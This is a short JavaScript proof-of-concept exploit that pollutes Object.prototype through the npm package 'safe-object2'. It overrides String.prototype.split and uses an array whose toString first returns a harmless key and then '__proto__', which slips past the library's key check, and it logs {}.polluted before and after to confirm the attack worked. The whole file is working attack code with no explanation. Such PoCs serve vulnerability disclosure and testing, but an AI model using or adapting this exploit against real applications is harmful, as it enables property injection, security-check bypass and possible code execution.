var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const safeObj2 = require('safe-object2');
const obj = safeObj2({});
console.log({}.polluted);
obj.setter([
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);